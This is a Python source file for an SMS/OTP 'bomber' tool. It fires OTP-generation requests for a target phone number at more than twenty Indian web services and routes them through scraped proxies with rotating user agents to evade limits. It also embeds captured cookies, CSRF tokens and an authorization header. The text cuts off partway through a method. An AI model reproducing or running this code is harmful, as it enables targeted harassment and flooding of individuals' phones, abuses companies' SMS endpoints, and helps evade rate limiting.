import json
import random
import requests


class Bomber:

    def __init__(self, user_mobile, number_of_messege):
        self.user_mobile = user_mobile
        self.number_of_messege = number_of_messege
        self.acceptlanguage = "en-GB,en-US;q=0.9,en;q=0.8"

    def getUserAgent(self):
        with open('useragent.json') as f:
            data = json.load(f)
            user_agent_list = data["user_agent"]
        userAgent = random.choice(user_agent_list)
        return userAgent

    def _checkinternet(self):
        try:
            requests.get("https://www.google.com")
            return True
        except:
            print("Check your internet connection and the modules")
            return False

    def getproxy(self):
        proxy_scrape_url = "https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=all"
        try:
            proxy_request = requests.get(proxy_scrape_url, Timeout=10)
        except:
            return False
        proxylist = proxy_request.text.split()
        return 'https://' + random.choice(proxylist)

    def flipkart(self):
        url = "https://rome.api.flipkart.com/api/7/user/otp/generate"
        flipkart_header = {
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": self.acceptlanguage,
            "Connection": "keep-alive",
            "Content-Length": "53",
            "Content-Type": "application/json",
            "DNT": "1",
            "Host": "rome.api.flipkart.com",
            "Origin": "https://www.flipkart.com",
            "Referer": "https://www.flipkart.com/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
            "User-Agent": self.getUserAgent(),
            "X-user-agent": self.getUserAgent() + " FKUA/website/42/website/Desktop"
        }
        try:
            request = requests.post(url, data=json.dumps(
                {"loginId": "+91" + self.user_mobile}), headers=flipkart_header, proxies={'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 200):
            return True

    def confirmtkt(self):
        url = "https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber=" + \
            self.user_mobile + "&newOtp=true"
        confirmtkt_header = {
            'authority': "securedapi.confirmtkt.com",
            'accept': "*/*",
            'accept-language': "en-US,en;q=0.9",
            'dnt': "1",
            'origin': "https://www.confirmtkt.com",
            'referer': "https://www.confirmtkt.com/",
            'sec-ch-ua': "^\^"
        }
        try:
            request = requests.get(url, headers=confirmtkt_header, proxies={
                                   'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 200):
            return True

    def apolopharmacy(self):
        url = "https://www.apollopharmacy.in/sociallogin/mobile/sendotp"
        apolopharmacy_header = {
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": self.acceptlanguage,
            "Connection": "keep-alive",
            "content-length": "17",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "dnt": "1",
            "origin": "https://www.apollopharmacy.in",
            "referer": "https://www.apollopharmacy.in/",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": self.getUserAgent(),
            "x-requested-with": "XMLHttpRequest",
        }
        try:
            request = requests.post(url, data="mobile=" + self.user_mobile,
                                    headers=apolopharmacy_header, proxies={'https': self.getproxy()})
        except:
            return False
        if (request.status_code == 200):
            return True

    def ajio(self):
        url = "https://login.web.ajio.com/api/auth/generateLoginOTP"
        ajio_header = {
            "accept": "application/json     ",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": self.acceptlanguage,
            "Connection": "keep-alive",
            "content-length": "29",
            "content-type": "application/json",
            "Host": "login.web.ajio.com",
            "dnt": "1",
            "origin": "https://www.ajio.com",
            "referer": "https://www.ajio.com/",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": self.getUserAgent()
        }
        try:
            request = requests.post(url, data=json.dumps(
                {"mobileNumber": self.user_mobile}), headers=ajio_header, proxies={'https': self.getproxy()})
        except:
            return False
        if (request.json()['success']):
            return True
        return False

    def unacademy(self):
        url = "https://unacademy.com/api/v1/user/get_app_link/"
        unac_header = {
            "accept": "application/json",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": self.acceptlanguage,
            "Connection": "keep-alive",
            "content-length": "107",
            "content-type": "application/json",
            "dnt": "1",
            "origin": "https://unacademy.com",
            "referer": "https://unacademy.com",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": self.getUserAgent()
        }
        try:
            request = requests.post(url, data=json.dumps(
                {"phone": self.user_mobile}), headers=unac_header, proxies={'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 200):
            return True

    def snapdeal(self):
        url = "https://www.snapdeal.com/sendOTP"
        snapdeal_head = {
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-length": "62",
            "content-type": "application/x-www-form-urlencoded",
            "DNT": "1",
            "Host": "www.snapdeal.com",
            "origin": "https://www.snapdeal.com",
            "referer": "https://www.snapdeal.com/iframeLogin",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": self.getUserAgent(),
            "X-Requested-With": "XMLHttpRequest"
        }
        try:
            request = requests.post(url, data="emailId=&mobileNumber=" + self.user_mobile +
                                    "&purpose=LOGIN_WITH_MOBILE_OTP", headers=snapdeal_head, proxies={'https': self.getproxy()})
        except:
            return False
        if (request.json()['status'] == "fail"):
            return False
        return True

    def jiomart(self):
        url = "https://www.jiomart.com/mst/rest/v1/id/details/" + self.user_mobile
        jiomart_header = {
            "accept": "application/json, text/plain,*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "dnt": "1",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": self.getUserAgent(),
            "referer": "https://www.jiomart.com/customer/account/login"
        }
        try:
            request = requests.get(url, headers=jiomart_header, proxies={
                                   'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 200):
            return True

    def upchar(self):
        url = "https://www.myupchar.com/registrations/store_otp"
        payload = "{\"phone\": "f'"{self.user_mobile}"'",\"name\":\"wdwd\",\"email\":\"dwwddw@dw.sd\",\"source\":\"web-UserRegistration-devise\"}"
        headers = {
            'cookie': "_ga=GA1.1.1901629367.1654419587; utm_refrer_myupchar=https%3A%2F%2Fwww.myupchar.com%2F; _marketplace_session=U2c0MUhTaC9VNEo5akNOSUlyNGZQVDNlWlpoQWt4eWY3ZFVKQkJSNSsxVDZqaUpmc1pWQTJDNmhEWmJxZHgxV25UaE12QThwdWdxMXpHd2VCc1lMK2cxWEdWdk1tbGNoUHdWTXA1RHZZdWpab3ZnTVJWSEpPbTFaRU5JWWppenNjWE9Ea1ZoOG51SmFZTFZKUm01OG5PU0p5K3MreU90WnBzUlU5WVVEK2FYTkxNNUh5bXJ6elBTdGxMdGlZWmtJQjBWelNjN0VCdUc0QlpTQkp6djlDQ2o5emlzdDNjcjFIQS8zQkR3ZXBrMEc4MUY3eFkyL2FNUWZwbmVVbUoyNEIremF0NWF2RG9jaHJOMzh0dVNqekE9PS0tbFRyUXR3SVZaVjdMbWtOZjIzWkdMUT09--ae368d251555a7c93c6cf75551ce755a120cbb56; _ga_RDVJWEGGPJ=GS1.1.1654419587.1.1.1654419588.0",
            'authority': "www.myupchar.com",
            'accept': "*/*",
            'accept-language': "en-US,en;q=0.9",
            'cache-control': "max-age=0",
            'content-type': "application/json",
            'dnt': "1",
            'origin': "https://www.myupchar.com",
            'sec-fetch-dest': "empty",
            'sec-fetch-mode': "cors",
            'sec-fetch-site': "same-origin",
            "user-agent": self.getUserAgent(),
            'x-csrf-token': "zMq4ZeAFqYtvgHrdXOp6xYrdQQjigTjugFrAD0uZSbU="
        }
        try:
            request = requests.request("POST", url, data=payload, headers=headers, proxies={
                'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 200):
            return True

    def tata(self):
        url = "https://myaccount.tatatel.co.in:4443/EBSSelfCare/LoginAction.do"
        querystring = {"methodToCall": "validateOTPDetails",
                       "identifier": "resend"}

        payload = f"methodToCall=&firstLogin=true&unregisterEmail=dwwddw%2540dw.sd&unregisterMobile={self.user_mobile}&userStatus=SUCCESS&emailIdPin=4558&mobileNoPin=1023&emailId=dwwddw%2540dw.sd&emailId=3223232323&emailOTP=&mobileOTP="
        headers = {
            'cookie': "JSESSIONID=9453deeefb1777922160b15caf30c5ce2b8abf9a8a9a8e5252a8e46587375b87",
            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            'Accept-Language': "en-US,en;q=0.9",
            'Cache-Control': "max-age=0",
            'Connection': "keep-alive",
            'Content-Type': "application/x-www-form-urlencoded",
            'DNT': "1",
            'Origin': "https://myaccount.tatatel.co.in:4443",
            'Referer': "https://myaccount.tatatel.co.in:4443/EBSSelfCare/LoginAction.do?methodToCall=loginUnregisterUser&emailId=dwwddw@dw.sd&mobileNo=3223232323",
            'Sec-Fetch-Dest': "iframe",
            'Sec-Fetch-Mode': "navigate",
            'Sec-Fetch-Site': "same-origin",
            'Sec-Fetch-User': "?1",
            'Upgrade-Insecure-Requests': "1",
            "user-agent": self.getUserAgent(),
        }
        try:
            request = requests.request("POST", url, data=payload, headers=headers, params=querystring, proxies={
                                       'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 200):
            return True

    def snapdeal(self):
        url = "https://www.snapdeal.com/signupAjax"
        payload = "{\"j_number\":"f"{self.user_mobile}"",\"j_username\":\"qw89ibiqs@gmail.com\",\"j_name\":\"dwwdwddwwd\",\"j_dob\":\"05/06/1997\",\"j_password\":\"ibhwdwj278@dw\",\"j_confpassword\":\"ibhwdwj278@dw\",\"CSRFToken\":\"c721707c510b297e116bde2d713eb73aa88225b8\",\"targetUrl\":\"\",\"mobileStart\":\"true\",\"numberEdit\":\"true\",\"socialid\":\"\",\"gender\":\"\",\"j_displayname\":\"\",\"language\":\"\",\"source\":\"\",\"lastname\":\"\",\"firstname\":\"\"}"
        headers = {'Accept': "application/json, text/javascript, */*; q=0.01",
                   'Accept-Language': "en-US,en;q=0.9",
                   'Connection': "keep-alive",
                   'Content-Type': "application/json;charset=UTF-8",
                   'Cookie': "versm=v1; deviceos=""; alps=akm; _gcl_au=1.1.1020611895.1654409383; isWebP=true; st=utm_source%3DSEO%7Cutm_content%3Dnull%7Cutm_medium%3Dnull%7Cutm_campaign%3Dnull%7Cref%3Dnull%7Cutm_term%3Dnull%7Caff_id%3Dnull%7Caff_sub%3Dnull%7Caff_sub2%3Dnull%7C; vt=utm_source%3DSEO%7Cutm_content%3Dnull%7Cutm_medium%3Dnull%7Cutm_campaign%3Dnull%7Cref%3Dnull%7Cutm_term%3Dnull%7Caff_id%3Dnull%7Caff_sub%3Dnull%7Caff_sub2%3Dnull%7C; lt=utm_source%3DSEO%7Cutm_content%3Dnull%7Cutm_medium%3Dnull%7Cutm_campaign%3Dnull%7Cref%3Dnull%7Cutm_term%3Dnull%7Caff_id%3Dnull%7Caff_sub%3Dnull%7Caff_sub2%3Dnull%7C; SCOUTER=x4atbgcio756h9; JSESSIONID=D6DF78305961CB35EA12ED4E1E1D7971; versn=v1; u=165440938341432113; sd.zone=Z5; xg=eyJ3YXAiOnsiYWUiOiIxIn0sInBzIjp7ImNiIjoiQyIsInVybCI6IloxIn0sInNjIjp7InNoaXBwaW5nX2ludGVydmFsIjoibWxfbmV3X3diIn0sInVpZCI6eyJndWlkIjoiZGNjOTdiYjMtMmEzZS00MzE2LThjYjgtYTliMDhkNzRhZDYxIn19fHwxNjU0NDExMTgzNDE4; xc=eyJ3YXAiOnsiYWUiOiIxIn0sInBzIjp7ImNiIjoiQyIsInVybCI6IloxIn0sInNjIjp7InNoaXBwaW5nX2ludGVydmFsIjoibWxfbmV3X3diIn19; _uetsid=17b2c850e49611eca9ab976308084d96; _uetvid=17b30470e49611ecb2a26be1361e9400; f5_cspm=1234; _sdDPPageId=1654409432153_1981_165440938341432113; s_sess=%20s_cc%3Dtrue%3B%20s_ppv%3D0%3B%20s_sq%3Djasper-snapdeal-prd%253D%252526pid%25253DiframeLogin%252526pidt%25253D1%252526oid%25253Djavascript%2525253Avoid(0)%2525253B%252526ot%25253DA%3B; Megatron=\u00213L4XTOFfb5oNivH+ZidaGBcQKxXOrIbCAYb56UdkfjW8QKQmUY8aO4+CYTV4eYJF0EfemOEMyz6cwJE=; s_pers=%20s_vnum%3D1657001384034%2526vn%253D1%7C1657001384034%3B%20gpv_pn%3DiframeLogin%7C1654411253729%3B%20s_invisit%3Dtrue%7C1654411253731%3B",
                   'DNT': "1",
                   'Origin': "https://www.snapdeal.com",
                   'Referer': "https://www.snapdeal.com/iframeLogin",
                   'Sec-Fetch-Dest': "empty",
                   'Sec-Fetch-Mode': "cors",
                   'Sec-Fetch-Site': "same-origin",
                   "user-agent": self.getUserAgent(),
                   'X-Requested-With': "XMLHttpRequest",
                   }
        try:
            request = requests.request("POST", url, data=payload, headers=headers, proxies={
                'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 200):
            return True

    def pharmeasy(self):
        url = "https://pharmeasy.in/api/auth/requestOTP"
        payload = "{\"contactNumber\":"f'"{self.user_mobile}"'"}"
        headers = {
            'authority': "pharmeasy.in",
            'accept': "*/*",
            'accept-language': "en-US,en;q=0.9",
            'content-type': "application/json",
            'cookie': "HAB_Var=NE; HAB_XDI=3qFYtTgwN7LDL-66mgFPF; X-App-Version=2.1; X-Phone-Platform=mweb; X-Default-City=1; X-Pincode=400001; _gcl_au=1.1.1573276293.1654420672; _ga=GA1.1.1551407676.1654420673; XdI=0a7db77ff1bb906e96ea3514c87e084b; WZRK_G=8a9dfc10e4954f5eb0fcc3db78d2cb43; XPESS=active; XPESD={%22session_id%22:%22s_w_8a9dfc10e4954f5eb0fcc3db78d2cb43_1654420674000%22%2C%22session_id_flag%22:%22ct_id%22%2C%22referrer%22:%22%22%2C%22session_start_time%22:%222022-06-05T09:17:54.650Z%22}; X-IP=103.206.138.95%2C%2010.46.9.46%2C%2023.46.9.94%2C%20104.91.59.239; _uetsid=60e7e680e4b011eca29e3353d558f5e2; _uetvid=60e82260e4b011eca46a31f5625fd13d; _ga_J4XE9SW84F=GS1.1.1654420673.1.1.1654420685.48; WZRK_S_R9Z-WWR-854Z=%7B%22p%22%3A3%2C%22s%22%3A1654420674%2C%22t%22%3A1654420694%7D; pe_last_active=Sun%20Jun%2005%202022%2014:48:16%20GMT+0530%20(India%20Standard%20Time)",
            'dnt': "1",
            'origin': "https://pharmeasy.in",
            'referer': "https://pharmeasy.in/?redirect=/online-medicine-order?src=homecard",
            'sec-fetch-dest': "empty",
            'sec-fetch-mode': "cors",
            'sec-fetch-site': "same-origin",
            "user-agent": self.getUserAgent(),
            'x-ff': "",
            'x-phone-platform': "web",
            'x-real-ip': "",
            'x-ua': ""
        }
        try:
            request = requests.request("POST", url, data=payload, headers=headers, proxies={
                'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 200):
            return True

    def okcredit(self):
        url = "https://web.okcredit.in/api/authn/v1.0/otp:request"
        payload = "{\"mobile\":"f"{self.user_mobile}"",\"mode\":0}"
        headers = {
            'authority': "web.okcredit.in",
            'accept': "*/*",
            'accept-language': "en-US,en;q=0.9",
            'content-type': "application/json",
            'cookie': "_gcl_au=1.1.1607132112.1654417832; i18next=en",
            'dnt': "1",
            'newrelic': "eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjI0MTE2MTMiLCJhcCI6IjkyNzMyODEwOCIsImlkIjoiODg4NWU1M2FjZWQxOGFjMCIsInRyIjoiOGU3NWM1ZGVmM2YzNDIzZWY0ZjFmOGM1NGQzYWVmZTAiLCJ0aSI6MTY1NDQxNzg1MDI2MH19",
            'origin': "https://web.okcredit.in",
            'referer': "https://web.okcredit.in/login",
            'sec-fetch-dest': "empty",
            'sec-fetch-mode': "cors",
            'sec-fetch-site': "same-origin",
            'traceparent': "00-8e75c5def3f3423ef4f1f8c54d3aefe0-8885e53aced18ac0-01",
            'tracestate': "2411613@nr=0-1-2411613-927328108-8885e53aced18ac0----1654417850260",
            "user-agent": self.getUserAgent(),
        }
        try:
            request = requests.request("POST", url, data=payload, headers=headers, proxies={
                'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 200):
            return True

    def naaptol(self):
        url = "https://www.naaptol.com/faces/jsp/ajax/ajax.jsp"
        payload = f"actionname=checkMobileUserExistsForTvApp&mobile={self.user_mobile}"
        headers = {
            'cookie': "NT-vfc=6WjUX5MjAyM1o%3DM",
            'Accept': "application/json, text/javascript, */*; q=0.01",
            'Accept-Language': "en-US,en;q=0.9",
            'Connection': "keep-alive",
            'Content-Type': "application/x-www-form-urlencoded; charset=UTF-8",
            'Cookie': "JSESSIONID=server3_cookie~520410CE48224C9925359FDD1724C891.frontend_node9; NT-language=1; CAMPAIGN_COOKIE=5-Organic-Org-Organic; _gcl_aw=GCL.1654417689.Cj0KCQjwqPGUBhDwARIsANNwjV7Ac_1BlCQePQwuQLzNGuVNstAHE1uNTaagpvncOpHb0A66hNpA88IaAtapEALw_wcB; _gcl_au=1.1.585766493.1654417689; _uetsid=6e9a06e0e4a911ec82dd39108d9bc91c; _uetvid=6e9a33d0e4a911ec889cf9f08c45f793",
            'DNT': "1",
            'Origin': "https://www.naaptol.com",
            'Referer': "https://www.naaptol.com/?utm_source=google&utm_medium=cpc&utm_campaign=RSA&gclid=Cj0KCQjwqPGUBhDwARIsANNwjV7Ac_1BlCQePQwuQLzNGuVNstAHE1uNTaagpvncOpHb0A66hNpA88IaAtapEALw_wcB",
            'Sec-Fetch-Dest': "empty",
            'Sec-Fetch-Mode': "cors",
            'Sec-Fetch-Site': "same-origin",
            "user-agent": self.getUserAgent(),
            'X-Requested-With': "XMLHttpRequest",
            'pageSecurityToken': "5VjE2NTQ0MTc2OD0U4OTdfbkBAcHRvbF83MjY1MTg1MkY=D",
        }
        try:
            request = requests.request("POST", url, data=payload, headers=headers, proxies={
                'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 200):
            return True

    def lenskart(self):
        url = "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp"

        payload = "{\"telephone\":"f'"{self.user_mobile}"'",\"captcha\":null,\"phoneCode\":\"+91\"}"
        headers = {'authority': "api-gateway.juno.lenskart.com",
                   'accept': "*/*",
                   'accept-language': "en-US,en;q=0.9",
                   'cache-control': "no-cache, no-store",
                   'content-type': "application/json",
                   'dnt': "1",
                   'origin': "https://www.lenskart.com",
                   'referer': "https://www.lenskart.com/",
                   'sec-fetch-mode': "cors",
                   'sec-fetch-site': "same-site",
                   "user-agent": self.getUserAgent(),
                   'x-accept-language': "en",
                   'x-api-client': "desktop",
                   'x-b3-traceid': "991654405662341",
                   'x-country-code': "in",
                   'x-session-token': "fc0a791f-5fb8-43c9-9af3-79a39dc77ca7"
                   }
        try:
            request = requests.request("POST", url, data=payload, headers=headers, proxies={
                'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 200):
            return True

    def justdial(self):
        url = "https://www.justdial.com/functions/whatsappverification.php"

        payload = f"mob={self.user_mobile}&vcode=&rsend=0&name=wddwdw"
        headers = {
            'authority': "www.justdial.com",
            'accept': "*/*",
            'accept-language': "en-US,en;q=0.9",
            'content-type': "application/x-www-form-urlencoded; charset=UTF-8",
            'dnt': "1",
            'origin': "https://www.justdial.com",
            'referer': "https://www.justdial.com/",
            'sec-ch-ua-platform': "Android",
            'sec-fetch-dest': "empty",
            'sec-fetch-mode': "cors",
            'sec-fetch-site': "same-origin",
            "user-agent": self.getUserAgent(),
            'x-frsc-token': "9838214a8d42cb7d4b9c943336c3c3801474f6a9ac56a6872508c66c1e2d45e6",
            'x-requested-with': "XMLHttpRequest"
        }
        try:
            request = requests.request("POST", url, data=payload, headers=headers, proxies={
                'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 200):
            return True

    def jobhai(self):
        url = "https://api.jobhai.com/auth/jobseeker/v2/send_otp"
        payload = "{\"phone\":"f"{self.user_mobile}""}"
        headers = {
            'authority': "api.jobhai.com",
            'accept': "application/json, text/plain, */*",
            'accept-language': "en-US,en;q=0.9",
            'content-type': "application/json;charset=UTF-8",
            'device-id': "9e63978f-2a29-4762-a316-0989dcfbb79c",
            'dnt': "1",
            'language': "en",
            'origin': "https://www.jobhai.com",
            'referer': "https://www.jobhai.com/",
            'sec-fetch-dest': "empty",
            'sec-fetch-mode': "cors",
            'sec-fetch-site': "same-site",
            'source': "WEB",
            "user-agent": self.getUserAgent(),
            'x-transaction-id': "JS-WEB-0a53af79-f33d-4e56-90b3-b9e4b107a522"
        }
        try:
            request = requests.request("POST", url, data=payload, headers=headers, proxies={
                'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 200):
            return True

    def indiamart(self):
        url = "https://m.indiamart.com/ajaxrequest/identified/common/otpVerification"
        payload = "{\"user\":"f"{self.user_mobile}"",\"screenName\":\"EDIT PROFILE\",\"type\":\"OTPGEN\",\"authCode\":\"\",\"glusr_id\":\"154146367\",\"ciso\":\"IN\",\"user_mobile_country_code\":\"91\",\"user_country\":\"India\",\"userIp\":\"103.238.108.180\",\"OTPResend\":0,\"emailVerify\":\"\",\"source\":\"\",\"msg_key\":0,\"attribute_id\":\"\",\"verifyUser\":false,\"glid\":\"154146367\"}"
        headers = {
            'authority': "m.indiamart.com",
            'accept': "*/*",
            'accept-language': "en-US,en;q=0.9",
            'content-type': "application/json",
            'dnt': "1",
            'origin': "https://m.indiamart.com",
            'referer': "https://m.indiamart.com/my/profile/",
            'sec-fetch-dest': "empty",
            'sec-fetch-mode': "cors",
            'sec-fetch-site': "same-origin",
            "user-agent": self.getUserAgent(),
        }
        try:
            request = requests.request("POST", url, data=payload, headers=headers, proxies={
                'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 200):
            return True

    def icq(self):
        url = "https://u.icq.net/api/v78/rapi/auth/sendCode"
        monumber = "91" + self.user_mobile
        payload = "{\"reqId\":\"52560-1654421401\",\"params\":{\"phone\":"f'"{monumber}"'",\"language\":\"en-US\",\"route\":\"sms\",\"devId\":\"ic1rtwz1s1Hj1O0r\",\"application\":\"icq\"}}"
        headers = {
            'authority': "u.icq.net",
            'accept': "*/*",
            'accept-language': "en-US,en;q=0.9",
            'content-type': "application/json",
            'dnt': "1",
            'origin': "https://web.icq.com",
            'referer': "https://web.icq.com/",
            'sec-fetch-dest': "empty",
            'sec-fetch-mode': "cors",
            'sec-fetch-site': "cross-site",
            "user-agent": self.getUserAgent(),
        }
        try:
            request = requests.request("POST", url, data=payload, headers=headers, proxies={
                'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 200):
            return True

    def dealshare(self):
        url = "https://www.dealshare.in/api/1.0/get-otp"
        payload = "{\"phoneNumber\":"f"{self.user_mobile}"",\"name\":\"\",\"hashCode\":\"\",\"resendOtp\":1}"
        headers = {
            'authority': "www.dealshare.in",
            'accept': "application/json, text/plain, */*",
            'accept-language': "en-US,en;q=0.9",
            'content-type': "application/json",
            'cookie': "_gcl_au=1.1.773299246.1654418784; _ga=GA1.1.259488213.1654418784; _ga_17JC851ECY=GS1.1.1654418783.1.0.1654418786.0",
            'dnt': "1",
            'origin': "https://www.dealshare.in",
            'referer': "https://www.dealshare.in/",
            'sec-fetch-dest': "empty",
            'sec-fetch-mode': "cors",
            'sec-fetch-site': "same-origin",
            "user-agent": self.getUserAgent(),
        }
        try:
            request = requests.request("POST", url, data=payload, headers=headers, proxies={
                'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 200):
            return True

    def confirmtkt(self):
        url = "https://securedapi.confirmtkt.com/api/platform/registerOutput"
        querystring = {"mobileNumber": f"{self.user_mobile}",
                       "newOtp": "true", "retry": "false", "testparamsp": "true"}
        payload = ""
        headers = {
            'authority': "securedapi.confirmtkt.com",
            'accept': "*/*",
            'accept-language': "en-US,en;q=0.9",
            'dnt': "1",
            'origin': "https://www.confirmtkt.com",
            'referer': "https://www.confirmtkt.com/",
            'sec-ch-ua': "^\^"
        }
        try:
            request = requests.request("POST", url, data=payload, headers=headers, proxies={
                'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 200):
            return True

    def ajio(self):
        url = "https://login.web.ajio.com/api/auth/signupSendOTP"

        payload = "{\"firstName\":\"dwwdwd\",\"login\":\"dwwdw@gmail.com\",\"password\":\"Ruunejwdd@8723\",\"genderType\":\"Female\",\"mobileNumber\":"f"{self.user_mobile}"",\"rilFnlRegisterReferralCode\":\"\",\"requestType\":\"SENDOTP\",\"newDesign\":false}"
        headers = {
            'cookie': "V=201; TS017df282=01ef61aed01682fc3d8b9c1287ef6c80989c893ab817f88dc1ff1c28ce5e201409227f1ee2a3722011c0f5227130edadd944a2c7c1c8b3e15e2e2641dabebd60d2dd49fab0db8c2ae9f2d0dc5ea747c44f2a6d89492e470e19cd627a64bb83d4a1b86efe8bb97e4f68283d05f768728490b62dfbeaefa013de6c695e5038462373118f1d4647b7c6daeb2d137199fe1b3fbd3293e277dcac9989ca103332e7508b8e50a485bdee79f197c0fa5b748d5b8780c3d662eb20905d134b35084a2bb258e5a197bdbf2a516ead03d2a095b9841622e89383ebc34c2e30f6001cc14a627ea9c99214061acb5972d4b3d00639080c88a73096882f8bd65eeec64c0e927e44394b5e74f00e29eb35ad7a0bf78845898874a0f06f647ecdd773fcbbefad198f04cd9dec91cbbcb630435d7515afc3936e45f148",
            'Accept-Language': "en-US,en;q=0.9",
            'Connection': "keep-alive",
            'DNT': "1",
            'Origin': "https://www.ajio.com",
            'Referer': "https://www.ajio.com/",
            'Sec-Fetch-Dest': "empty",
            'Sec-Fetch-Mode': "cors",
            'Sec-Fetch-Site': "same-site",
            "user-agent": self.getUserAgent(),
            'accept': "application/json",
            'content-type': "application/json",
        }
        try:
            request = requests.request("POST", url, data=payload, headers=headers, proxies={
                'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 200):
            return True

    def onecard(self):
        url = "https://card.fplabs.tech:9000/onecard/bff/open/v1/web/otp/generate"
        payload = "{\"mobile\":"f'"{self.user_mobile}"'",\"deviceType\":\"WEB\",\"whatsappConsent\":false}"
        headers = {
            'authority': "card.fplabs.tech:9000",
            'accept': "application/json, text/plain, */*",
            'accept-language': "en-US,en;q=0.9",
            'authorization': "Basic ZnBsYWJzOjFGUExhYnMyMzIw",
            'content-type': "application/json",
            'data_attributes': "",
            'dnt': "1",
            'origin': "https://apply.getonecard.app",
            'partner_name': "",
            'referer': "https://apply.getonecard.app/",
            'sec-fetch-dest': "empty",
            'sec-fetch-mode': "cors",
            'sec-fetch-site': "cross-site",
            'user-agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 Edg/102.0.1245.33",
            'utm_campaign': "Web_TopNavOS_ApplyNow",
            'utm_id': "TopNavOS_ApplyNow",
            'utm_medium': "TopNavOS_Apply_Now",
            'utm_source': "OneScore Website"
        }
        try:
            request = requests.request("POST", url, data=payload, headers=headers, proxies={
                'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 200):
            return True

    def dMart(self):
        url = "https://digital.dmart.in/api/v1/secure/otp"

        payload = "{\"userId\":"f'"{self.user_mobile}"'",\"resendOtp\":\"true\"}"
        headers = {
            'authority': "digital.dmart.in",
            'accept': "application/json, text/plain, */*",
            'accept-language': "en-US,en;q=0.9",
            'content-type': "application/json",
            'dm_token': "",
            'dnt': "1",
            'origin': "https://www.dmart.in",
            'sec-fetch-dest': "empty",
            'sec-fetch-mode': "cors",
            'sec-fetch-site': "same-site",
            'storeid': "10151",
            'user-agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 Edg/102.0.1245.33"
        }
        try:
            request = requests.request("POST", url, data=payload, headers=headers, proxies={
                'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 200):
            return True

    def kreditBee(self):
        url = "https://api.kreditbee.in/v1/me/otp"

        querystring = {"reason": "loginOrRegister",
                       "mobile": f"{self.user_mobile}"}

        payload = ""
        headers = {
            'authority': "api.kreditbee.in",
            'accept': "application/json, text/plain, */*",
            'accept-language': "en-US,en;q=0.9",
            'authorization': "Bearer null",
            'dnt': "1",
            'origin': "https://pwa-web1.kreditbee.in",
            'referer': "https://pwa-web1.kreditbee.in/",
            'sec-fetch-dest': "empty",
            'sec-fetch-mode': "cors",
            'sec-fetch-site': "same-site",
            'user-agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 Edg/102.0.1245.33",
            'x-kb-info': "eyJkaWQiOiIiLCJhcHB0eXBlIjoid2ViIiwiYXBwdmVyIjoiIn0="
        }
        try:
            request = requests.request("GET", url, data=payload, headers=headers, params=querystring, proxies={
                'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 200):
            return True

    def purplle(self):

        url = "https://www.purplle.com/api/account/authorization/send_otp"
        querystring = {"phone": {self.user_mobile}}

        payload = ""
        headers = {
